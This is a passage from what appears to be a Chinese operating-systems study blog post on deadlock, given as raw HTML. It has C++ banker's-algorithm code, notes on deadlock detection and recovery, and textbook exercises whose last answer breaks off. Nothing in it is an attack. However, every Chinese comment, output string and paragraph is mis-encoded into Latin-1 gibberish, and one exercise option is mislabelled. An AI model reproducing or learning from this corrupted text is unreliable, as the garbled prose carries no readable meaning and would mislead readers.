class="hljs-keyword">void</span> <span class="hljs-title">print_information</span><span class="hljs-params">()</span> <span class="hljs-comment">//æ‰“å°è¿›ç¨‹èµ„æºè¡¨</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;-----------------------------------è¿›ç¨‹èµ„æºè¡¨------------------------------------&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|    è¿›ç¨‹åç§°   |   å·²å ç”¨èµ„æº  |    å°šéœ€èµ„æº   |  æœ€å¤§æ‰€éœ€èµ„æº |  èµ„æºå‰©ä½™å®ä¾‹ |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-string">&quot;|&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span> * recourse_num; j++)<br>    &#123;<br><br>        cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; <span class="hljs-built_in"><span class="hljs-keyword">char</span></span>(j % recourse_num + <span class="hljs-string">&#x27;A&#x27;</span>);<br>        <span class="hljs-keyword">if</span> ((j + <span class="hljs-number">1</span>) % recourse_num == <span class="hljs-number">0</span>)<br>            cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>    &#125;<br>    cout &lt;&lt; endl;<br>    <span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;|&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;P[&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;]&quot;</span>; <span class="hljs-comment">//è¿›ç¨‹åç§°</span><br>        cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; Allocation[i][j]; <span class="hljs-comment">//å·²å ç”¨èµ„æº</span><br>        &#125;<br>        cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; Need[i][j]; <span class="hljs-comment">//å°šéœ€èµ„æº</span><br>        &#125;<br>        cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; Max[i][j]; <span class="hljs-comment">//æœ€å¤§æ‰€éœ€èµ„æº</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (k == <span class="hljs-number">0</span>)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>            &#123;<br>                cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; Available[j]; <span class="hljs-comment">//èµ„æºå‰©ä½™å®ä¾‹</span><br>            &#125;<br>            cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span> &lt;&lt; endl;<br>            k = <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>            cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-string">&quot;|&quot;</span> &lt;&lt; endl;<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------------------------------------------------&quot;</span> &lt;&lt; endl<br>         &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">security_test</span><span class="hljs-params">()</span> <span class="hljs-comment">//å®‰å…¨æ€§æ£€æŸ¥</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> work[recourse_num];<br>    <span class="hljs-keyword">bool</span> finish[process_num];<br>    <span class="hljs-keyword">int</span> count, k = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; recourse_num; i++) <span class="hljs-comment">//åˆå§‹åŒ–work</span><br>    &#123;<br>        work[i] = Available[i];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++) <span class="hljs-comment">//è®¾ç½®false</span><br>    &#123;<br>        finish[i] = <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++) <span class="hljs-comment">////æ»¡è¶³æ¡ä»¶é‡Šæ”¾èµ„æºï¼Œå¹¶ä»å¤´å¼€å§‹æ‰«æè¿›ç¨‹é›†åˆ</span><br>    &#123;<br>        count = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>            <span class="hljs-keyword">if</span> (finish[i] == <span class="hljs-literal">false</span> &amp;&amp; Need[i][j] &lt;= work[j])<br>                count++;<br>        <span class="hljs-keyword">if</span> (count == recourse_num) <span class="hljs-comment">//å½“è¿›ç¨‹å„ç±»èµ„æºéƒ½æ»¡è¶³NEED&lt;=WORKæ—¶</span><br>        &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>                work[j] = work[j] + Allocation[i][j]; <span class="hljs-comment">//é‡Šæ”¾è¿›ç¨‹</span><br>            finish[i] = <span class="hljs-literal">true</span>;<br>            sign[k] = i; <span class="hljs-comment">//è®°å½•ä¸‹æ»¡è¶³æ¡ä»¶çš„è¿›ç¨‹</span><br>            k++;<br>            i = <span class="hljs-number">-1</span>; <span class="hljs-comment">//ä»å¤´å¼€å§‹æ‰«æ</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++)<br>        <span class="hljs-keyword">if</span> (finish[i] == <span class="hljs-literal">false</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Banker_Algorithm</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span> <span class="hljs-comment">//èµ„æºè¯·æ±‚ç®—æ³•</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> m = <span class="hljs-number">0</span>; m &lt; recourse_num; m++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (Request[i][m] &gt; Need[i][m])<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;æ‰€éœ€èµ„æºæ•°è¶…å‡ºå…¶å®£å¸ƒçš„æœ€å¤§å€¼!&quot;</span> &lt;&lt; endl;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Request[i][m] &gt; Available[m])<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;æ— è¶³å¤Ÿèµ„æºï¼Œp[&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;]éœ€ç­‰å¾…!&quot;</span> &lt;&lt; endl;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å°è¯•ä¸ºè¿›ç¨‹åˆ†é…èµ„æº</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>    &#123;<br>        Available[j] = Available[j] - Request[i][j];<br>        Allocation[i][j] = Allocation[i][j] + Request[i][j];<br>        Need[i][j] = Need[i][j] - Request[i][j];<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;å°è¯•è¿›è¡Œèµ„æºåˆ†é…åçš„è¿›ç¨‹èµ„æºè¡¨: &quot;</span> &lt;&lt; endl;<br>    <span class="hljs-built_in">print_information</span>();<br>    <span class="hljs-comment">//æ‰§è¡Œå®‰å…¨æ€§ç®—æ³•</span><br>    cout &lt;&lt; <span class="hljs-string">&quot;æ­£åœ¨è¿›è¡Œå®‰å…¨æ€§æ£€æŸ¥&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">security_test</span>())<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;ç»å®‰å…¨æ€§æ£€æŸ¥ï¼Œç³»ç»Ÿå®‰å…¨ï¼Œæœ¬æ¬¡åˆ†é…æˆåŠŸ&quot;</span> &lt;&lt; endl;<br>        cout &lt;&lt; <span class="hljs-string">&quot;å®‰å…¨è¿›ç¨‹åºåˆ—ä¸ºï¼š&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> p = <span class="hljs-number">0</span>; p &lt; process_num - <span class="hljs-number">1</span>; p++)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;P[&quot;</span> &lt;&lt; sign[p] &lt;&lt; <span class="hljs-string">&quot;]---&gt;&quot;</span>; <span class="hljs-comment">//è¾“å‡ºå®‰å…¨çš„è¿›ç¨‹åºåˆ—</span><br>        &#125;<br>        cout &lt;&lt; <span class="hljs-string">&quot;P[&quot;</span> &lt;&lt; sign[process_num - <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-string">&quot;]&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;å®‰å…¨æ€§æ£€æµ‹å¤±è´¥!ç³»ç»Ÿä¸å®‰å…¨!!!æ­£åœ¨æ¢å¤èµ„æºåˆ†é…------&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++) <span class="hljs-comment">//æ¢å¤è¿›ç¨‹èµ„æºåˆ†é…</span><br>        &#123;<br>            Available[j] = Available[j] + Request[i][j];<br>            Allocation[i][j] = Allocation[i][j] - Request[i][j];<br>            Need[i][j] = Need[i][j] + Request[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">init</span>();<br>    cout &lt;&lt; <span class="hljs-string">&quot;åˆå§‹åŒ–è¿›ç¨‹ä¿¡æ¯ä¸ºï¼š&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-built_in">print_information</span>();<br>    <span class="hljs-keyword">int</span> i, tt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (tt != <span class="hljs-number">999</span>)<br>    &#123;<br>        cout &lt;&lt; endl<br>             &lt;&lt; <span class="hljs-string">&quot;è¯·è¾“å…¥è¯·æ±‚èµ„æºRequest[è¿›ç¨‹æ ‡å·i][èµ„æºç±»å‹j]:&quot;</span> &lt;&lt; endl;<br>        cout &lt;&lt; <span class="hljs-string">&quot;è¿›ç¨‹i=ï¼š&quot;</span>;<br>        cin &gt;&gt; i;<br>        cout &lt;&lt; <span class="hljs-string">&quot;å„ç±»èµ„æºæ•°é‡(A B C)=:  &quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> m = <span class="hljs-number">0</span>; m &lt; recourse_num; m++)<br>            cin &gt;&gt; Request[i][m];<br>        cout &lt;&lt; endl;<br>        <span class="hljs-comment">//æ‰§è¡Œé“¶è¡Œå®¶ç®—æ³•</span><br>        <span class="hljs-built_in">Banker_Algorithm</span>(i);<br>        <span class="hljs-comment">//è¾“å‡ºæ¯æ¬¡åˆ¤æ–­äº§ç”Ÿçš„æ‰§è¡Œåºåˆ—</span><br>        cout &lt;&lt; endl<br>             &lt;&lt; <span class="hljs-string">&quot;å½“å‰èµ„æºåˆ†é…è¡¨ï¼š&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-built_in">print_information</span>();<br>        cout &lt;&lt; endl<br>             &lt;&lt; <span class="hljs-string">&quot;è¯·è¾“å…¥N(å½“N=999é€€å‡º)ï¼š&quot;</span> &lt;&lt; endl;<br>        cin &gt;&gt; tt;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="3é“¶è¡Œå®¶ç®—æ³•ç¼ºç‚¹"><a class="markdownIt-Anchor" href="#3é“¶è¡Œå®¶ç®—æ³•ç¼ºç‚¹"></a> 3ï¼‰é“¶è¡Œå®¶ç®—æ³•ç¼ºç‚¹</h4><ul><li>è¿›ç¨‹å¾ˆéš¾åœ¨è¿è¡Œå‰çŸ¥é“å…¶æ‰€éœ€èµ„æºçš„æœ€å¤§å€¼ã€‚</li><li>ç³»ç»Ÿä¸­å„è¿›ç¨‹ä¹‹é—´å¿…é¡»æ˜¯æ— å…³çš„ï¼Œå³æ²¡æœ‰åŒæ­¥è¦æ±‚ï¼Œæ— æ³•å¤„ç†æœ‰åŒæ­¥å…³ç³»çš„è¿›ç¨‹ã€‚</li><li>è¿›ç¨‹çš„æ•°é‡å’Œèµ„æºçš„æ•°ç›®æ˜¯å›ºå®šä¸å˜çš„ï¼Œæ— æ³•å¤„ç†è¿›ç¨‹æ•°é‡å’Œèµ„æºæ•°ç›®åŠ¨æ€å˜åŒ–çš„æƒ…å†µã€‚</li></ul><h2 id="76-æ­»é”æ£€æµ‹"><a class="markdownIt-Anchor" href="#76-æ­»é”æ£€æµ‹"></a> 7.6 æ­»é”æ£€æµ‹</h2><h3 id="761-æ¯ç§èµ„æºç±»å‹åªæœ‰å•ä¸ª"><a class="markdownIt-Anchor" href="#761-æ¯ç§èµ„æºç±»å‹åªæœ‰å•ä¸ª"></a> 7.6.1 æ¯ç§èµ„æºç±»å‹åªæœ‰å•ä¸ª</h3><p>å¦‚æœæ‰€æœ‰èµ„æºç±»å‹åªæœ‰å•ä¸ªå®ä¾‹ï¼Œé‚£ä¹ˆå¯ä»¥å®šä¹‰è¿™æ ·ä¸€ä¸ªæ­»é”æ£€æµ‹ç®—æ³•ï¼Œè¯¥ç®—æ³•ä½¿ç”¨äº†èµ„æºåˆ†é…å›¾çš„ä¸€ä¸ªå˜ç§ï¼Œç§°ä¸ºç­‰å¾…ï¼ˆwait-forï¼‰å›¾ã€‚ä»èµ„æºåˆ†é…å›¾ä¸­ï¼Œåˆ é™¤æ‰€æœ‰èµ„æºç±»å‹èŠ‚ç‚¹ï¼Œåˆå¹¶é€‚å½“è¾¹ï¼Œå°±å¯ä»¥å¾—åˆ°ç­‰å¾…å›¾ã€‚</p><p>å½“ä¸”ä»…å½“ç­‰å¾…å›¾ä¸­æœ‰ä¸€ä¸ªç¯ï¼Œ ç³»ç»Ÿä¸­å­˜åœ¨æ­»é”ã€‚ ä¸ºäº†æ£€æµ‹æ­»é”ï¼Œ ç³»ç»Ÿéœ€è¦ç»´æŠ¤ç­‰å¾…å›¾ï¼Œå¹¶å‘¨æœŸæ€§åœ°è°ƒç”¨åœ¨å›¾ä¸­è¿›è¡Œæœç´¢çš„ç®—æ³•ã€‚ä»å›¾ä¸­æ£€æµ‹ç¯çš„ç®—æ³•éœ€è¦n<sup>2</sup>çº§æ“ä½œï¼Œ å…¶ä¸­nä¸ºå›¾ä¸­çš„èŠ‚ç‚¹æ•°ã€‚</p><p><img src="/posts/8ce3e425/image-20220111113157466.png" alt="image-20220111113157466"></p><h3 id="762-æ¯ç§èµ„æºç±»å‹å¯æœ‰å¤šä¸ª"><a class="markdownIt-Anchor" href="#762-æ¯ç§èµ„æºç±»å‹å¯æœ‰å¤šä¸ª"></a> 7.6.2 æ¯ç§èµ„æºç±»å‹å¯æœ‰å¤šä¸ª</h3><p><img src="/posts/8ce3e425/image-20220111114549547.png" alt="image-20220111114549547"></p><p><img src="/posts/8ce3e425/image-20220111114535791.png" alt="image-20220111114535791"></p><h2 id="77-æ­»é”æ¢å¤"><a class="markdownIt-Anchor" href="#77-æ­»é”æ¢å¤"></a> 7.7 æ­»é”æ¢å¤</h2><p>æ‰“ç ´æ­»é”æœ‰ä¸¤ä¸ªæ–¹æ³•ã€‚</p><ul><li>ä¸€ä¸ªæ–¹æ³•æ˜¯ç®€å•åœ°ç»ˆæ­¢ä¸€ä¸ªæˆ–å¤šä¸ªè¿›ç¨‹ä»¥æ‰“ç ´å¾ªç¯ç­‰å¾…ã€‚</li><li>å¦ä¸€ä¸ªæ–¹æ³•æ˜¯ä»ä¸€ä¸ªæˆ–å¤šä¸ªæ­»é”è¿›ç¨‹é‚£é‡ŒæŠ¢å ä¸€ä¸ªæˆ–å¤šä¸ªèµ„æºã€‚</li></ul><h3 id="771-è¿›ç¨‹ç»ˆæ­¢"><a class="markdownIt-Anchor" href="#771-è¿›ç¨‹ç»ˆæ­¢"></a> 7.7.1 è¿›ç¨‹ç»ˆæ­¢</h3><p>æœ‰ä¸¤ç§æ–¹æ³•é€šè¿‡ç»ˆæ­¢è¿›ç¨‹ä»¥å–æ¶ˆæ­»é”ã€‚ ä¸ç®¡é‡‡ç”¨å“ªä¸ªæ–¹æ³•ï¼Œç³»ç»Ÿéƒ½ä¼šæ”¶å›åˆ†é…ç»™è¢«ç»ˆæ­¢è¿›ç¨‹çš„æ‰€æœ‰èµ„æºã€‚</p><ul><li>ç»ˆæ­¢æ‰€æœ‰æ­»é”è¿›ç¨‹ã€‚è¿™ç§æ–¹æ³•æ˜¾ç„¶ç»ˆæ­¢äº†æ­»é”å¾ªç¯ï¼Œä½†å…¶ä»£ä»·ä¹Ÿå¤§ã€‚è¿™äº›è¿›ç¨‹å¯èƒ½å·±è®¡ç®—äº†å¾ˆé•¿æ—¶é—´ï¼Œè¿™äº›éƒ¨åˆ†è®¡ç®—ç»“æœå¿…é¡»æ”¾å¼ƒï¼Œä»¥åå¯èƒ½è¿˜è¦é‡æ–°è®¡ç®—ã€‚</li><li>ä¸€æ¬¡åªç»ˆæ­¢ä¸€ä¸ªè¿›ç¨‹ç›´åˆ°å–æ¶ˆæ­»é”å¾ªç¯ä¸ºæ­¢ã€‚è¿™ç§æ–¹æ³•çš„å¼€é”€ä¼šç›¸å½“å¤§ï¼Œè¿™æ˜¯å› ä¸ºæ¯æ¬¡ç»ˆæ­¢ä¸€ä¸ªè¿›ç¨‹ï¼Œéƒ½å¿…é¡»è°ƒç”¨æ­»é”æ£€æµ‹ç®—æ³•ä»¥ç¡®å®šè¿›ç¨‹æ˜¯å¦ä»å¤„äºæ­»é”ã€‚</li></ul><h3 id="772-èµ„æºæŠ¢å "><a class="markdownIt-Anchor" href="#772-èµ„æºæŠ¢å "></a> 7.7.2 èµ„æºæŠ¢å </h3><p>å¦‚æœè¦æ±‚ä½¿ç”¨æŠ¢å æ¥å¤„ç†æ­»é”ï¼Œ é‚£ä¹ˆæœ‰ä¸‰ä¸ªé—®é¢˜éœ€è¦å¤„ç†ï¼š</p><ol><li>é€‰æ‹©ä¸€ä¸ªç‰ºç‰²å“ï¼š æŠ¢å å“ªäº›èµ„æºå’Œå“ªä¸ªè¿›ç¨‹ï¼Ÿä¸è¿›ç¨‹å–æ¶ˆä¸€æ ·ï¼Œ å¿…é¡»ç¡®å®šæŠ¢å é¡ºåºä»¥ä¾¿ä»£ä»·æœ€å°åŒ–ã€‚ä»£ä»·å› ç´ åŒ…æ‹¬è®¸å¤šå‚æ•°ï¼Œ å¦‚æ­»é”è¿›ç¨‹æ‰€æ‹¥æœ‰çš„èµ„æºæ•°é‡ï¼Œæ­»é”è¿›ç¨‹åˆ°ç°åœ¨ä¸ºæ­¢åœ¨å…¶æ‰§è¡Œè¿‡ç¨‹ä¸­æ‰€æ¶ˆè€—çš„æ—¶é—´ã€‚</li><li>å›æ»šï¼šå¦‚æœä»ä¸€ä¸ªè¿›ç¨‹é‚£é‡ŒæŠ¢å ä¸€ä¸ªèµ„æºï¼Œé‚£ä¹ˆè¯¥è¿›ç¨‹ä¸èƒ½æ­£å¸¸æ‰§è¡Œï¼Œå®ƒç¼ºå°‘æ‰€éœ€è¦çš„èµ„æºã€‚ å¿…é¡»å°†è¿›ç¨‹å›æ¶²åˆ°æŸä¸ªå®‰å…¨çŠ¶æ€ï¼Œä»¥ä¾¿ä»è¯¥çŠ¶æ€é‡å¯è¿›ç¨‹ã€‚ é€šå¸¸ç¡®å®šä¸€ä¸ªå®‰å…¨çŠ¶æ€å¹¶ä¸å®¹æ˜“ï¼Œæ‰€ä»¥æœ€ç®€å•çš„æ–¹æ³•æ˜¯å®Œå…¨å›æ»šï¼šç»ˆæ­¢è¿›ç¨‹å¹¶é‡æ–°æ‰§è¡Œã€‚æ›´ä¸ºæœ‰æ•ˆçš„æ–¹æ³•æ˜¯å°†è¿›ç¨‹å›æ»šåˆ°è¶³å¤Ÿæ‰“ç ´æ­»é”ã€‚ å¦ä¸€æ–¹é¢ï¼Œè¿™ç§æ–¹æ³•è¦æ±‚ç³»ç»Ÿç»´æŠ¤æœ‰å…³è¿è¡Œè¿›ç¨‹çŠ¶æ€çš„æ›´å¤šä¿¡æ¯ã€‚</li><li>é¥¥é¥¿ï¼šå¦‚æœä¸€ä¸ªç³»ç»Ÿæ˜¯åŸºäºä»£ä»·æ¥é€‰æ‹©ç‰ºç‰²è¿›ç¨‹ï¼Œ é‚£ä¹ˆåŒä¸€è¿›ç¨‹å¯èƒ½æ€»æ˜¯è¢«é€‰ä¸ºç‰ºç‰²å“ã€‚ç»“æœï¼Œè¿™ä¸ªè¿›ç¨‹æ°¸è¿œä¸èƒ½å®Œæˆå…¶æŒ‡å®šä»»åŠ¡ï¼Œä»»ä½•å®é™…ç³»ç»Ÿéƒ½éœ€è¦å¤„ç†è¿™ç§é¥¥é¥¿æƒ…å†µã€‚æ˜¾ç„¶ï¼Œå¿…é¡»ç¡®ä¿ä¸€ä¸ªè¿›ç¨‹åªèƒ½æœ‰é™åœ°è¢«é€‰æ‹©ä¸ºç‰ºç‰²å“ã€‚æœ€ä¸ºå¸¸ç”¨çš„æ–¹æ³•æ˜¯åœ¨ä»£ä»·å› ç´ ä¸­åŠ ä¸Šå›æ»šæ¬¡æ•°ã€‚</li></ol><h2 id="78-ä¹ é¢˜"><a class="markdownIt-Anchor" href="#78-ä¹ é¢˜"></a> 7.8 ä¹ é¢˜</h2><h3 id="74"><a class="markdownIt-Anchor" href="#74"></a> 7.4</h3><blockquote><p>æ ¹æ®å¦‚ä¸‹ä¸¤ç‚¹ï¼Œ æ¯”è¾ƒå¾ªç¯ç­‰å¾…æ–¹æ³•ä¸å„ç§æ­»é”é¿å…æ–¹æ³•ï¼ˆå¦‚é“¶è¡Œå®¶ç®—æ³•ã€‰ï¼š<br>a. è¿è¡Œæ—¶å¼€é”€ã€‚<br>b. ç³»ç»Ÿååé‡ã€‚</p></blockquote><p>ç”±äºè·Ÿè¸ªå½“å‰èµ„æºåˆ†é…çš„æˆæœ¬ï¼Œæ­»é”é¿å…æ–¹æ¡ˆå¾€å¾€ä¼šå¢åŠ è¿è¡Œæ—¶å¼€é”€ã€‚ç„¶è€Œï¼Œä¸é™æ€é˜²æ­¢æ­»é”å½¢æˆçš„æ–¹æ¡ˆç›¸æ¯”ï¼Œæ­»é”é¿å…æ–¹æ¡ˆå…è®¸æ›´å¤šçš„èµ„æºå¹¶å‘ä½¿ç”¨ã€‚ä»è¿™ä¸ªæ„ä¹‰ä¸Šè®²ï¼Œæ­»é”é¿å…æ–¹æ¡ˆå¯ä»¥æé«˜ç³»ç»Ÿååé‡ã€‚</p><h3 id="75"><a class="markdownIt-Anchor" href="#75"></a> 7.5</h3><blockquote><p>åœ¨ä¸€ä¸ªçœŸå®çš„è®¡ç®—æœºç³»ç»Ÿä¸­ ï¼Œ å¯ç”¨çš„èµ„æºå’Œè¿›ç¨‹å¯¹èµ„æºçš„è¦æ±‚éƒ½ä¸ä¼šæŒç»­å¾ˆä¹…ï¼ˆå‡ ä¸ªæœˆã€‰ã€‚èµ„æºä¼šæŸåå’Œè¢«æ›¿æ¢ï¼Œ æ–°çš„è¿›ç¨‹ä¼šè¿›å…¥å’Œç¦»å¼€ç³»ç»Ÿï¼Œ æ–°çš„èµ„æºä¼šè¢«è´­ä¹°å’Œ åŠ å…¥ç³»ç»Ÿã€‚ å¦‚æœç”¨é“¶è¡Œå®¶ç®—æ³•æ§åˆ¶<br>æ­»é”ï¼Œä¸‹é¢å“ªäº›å˜åŒ–åœ¨ä»€ä¹ˆæƒ…å†µä¸‹æ˜¯å®‰å…¨çš„ï¼ˆä¸ä¼šå¯¼è‡´æ­»é”ï¼‰ ï¼Ÿ</p><ul><li>a. å¢åŠ å¯ç”¨èµ„æºã€ˆæ–°çš„èµ„æºè¢«åŠ å…¥ç³»ç»Ÿï¼‰</li><li>b. å‡å°‘å¯ç”¨èµ„æºï¼ˆèµ„æºè¢«ä»ç³»ç»Ÿä¸­æ°¸ä¹…æ€§åœ°ç§»å‡ºã€‰</li><li>c. å¢åŠ ä¸€ä¸ªè¿›ç¨‹çš„Max ï¼ˆè¿›ç¨‹éœ€è¦æ›´å¤šçš„èµ„æºï¼Œ è¶…è¿‡æ‰€å…è®¸</li><li>çš„èµ„æºï¼‰</li><li>d. å‡å°‘ä¸€ä¸ªè¿›ç¨‹çš„Max ï¼ˆè¿›ç¨‹ä¸å†éœ€è¦é‚£ä¹ˆå¤šèµ„æºï¼‰</li><li>e. å¢åŠ è¿›ç¨‹çš„æ•°é‡</li><li>t. å‡å°‘è¿›ç¨‹çš„æ•°é‡</li></ul></blockquote><p>aï¼Œdï¼Œfå®‰å…¨</p><p>eéœ€è¦åœ¨ç»™è¿›ç¨‹åˆ†é…èµ„æºæ—¶ç¡®ä¿ç³»ç»Ÿä¸ä¼šè¿›å…¥ä¸å®‰å…¨çŠ¶æ€</p><p>b,cå¯èƒ½ä¼šå¯¼è‡´æ­»é”ï¼Œå¦‚æœè¿›å…¥ä¸å®‰å…¨çŠ¶æ€çš„è¯</p><h3 id="78"><a class="markdownIt-Anchor" href="#78"></a> 7.8</h3><blockquote><p>è€ƒè™‘è¿™æ ·çš„å“²å­¦å®¶å°±é¤é—®é¢˜ï¼š ç­·å­æ”¾åœ¨æ¡Œå­ä¸­å¤®ï¼Œ ä¸”ä¸€ä¸ªå“²å­¦å®¶å¯ä½¿ç”¨ä»»ä¸¤åªç­·å­ã€‚å‡å®šä¸€æ¬¡åªèƒ½è¯·æ±‚ä¸€åªç­·å­ã€‚è®¾è®¡ä¸€ç®€å•è§„åˆ™ï¼Œ å¯ä»¥æ ¹æ®ç°æœ‰ç­·å­åˆ†é…æ¥ç¡®å®šæŸä¸ªè¯·æ±‚æ˜¯å¦å¯æ»¡è¶³è€Œä¸ä¼šå‡ºç°æ­»é”ã€‚</p></blockquote><p>ä»¥ä¸‹è§„åˆ™é¿å…äº†æ­»é”ï¼šå½“ä¸€ä¸ªå“²å­¦å®¶å‘å‡ºä¸€ä¸ªéœ€è¦ç¬¬ä¸€æ ¹ç­·å­çš„è¯·æ±‚æ—¶ï¼Œå¦‚æœæ²¡æœ‰åˆ«çš„å“²å­¦å®¶æœ‰ä¸¤æ ¹ç­·å­æˆ–è€…åªç•™æœ‰ä¸€æ ¹ç­·å­æ—¶ï¼Œè¿™ä¸ªè¯·æ±‚å°±ä¸è¢«å…è®¸ã€‚</p><h3 id="711"><a class="markdownIt-Anchor" href="#711"></a> 7.11</h3><blockquote><p>è€ƒè™‘ä¸‹é¢çš„ä¸€ä¸ªç³»ç»Ÿåœ¨æŸä¸€æ—¶åˆ»çš„çŠ¶æ€ã€‚</p><p><img src="/posts/8ce3e425/image-20211201232218325.png" alt="image-20211201232218325"></p><p>ä½¿ç”¨é“¶è¡Œå®¶ç®—æ³•å›ç­”ä¸‹é¢é—®é¢˜ï¼š<br>a.Need çŸ©é˜µçš„å†…å®¹æ˜¯æ€æ ·çš„ï¼Ÿ<br>b. ç³»ç»Ÿæ˜¯å¦å¤„äºå®‰å…¨çŠ¶æ€ï¼Ÿ<br>c. å¦‚æœä»è¿›ç¨‹Pi å‘æ¥ä¸€ä¸ªè¯·æ±‚(0ï¼Œ4ï¼Œ2,0ï¼‰ï¼Œ è¿™ä¸ªè¯·æ±‚èƒ½å¦ç«‹åˆ»è¢«æ»¡è¶³ï¼Ÿ</p></blockquote><p>a. 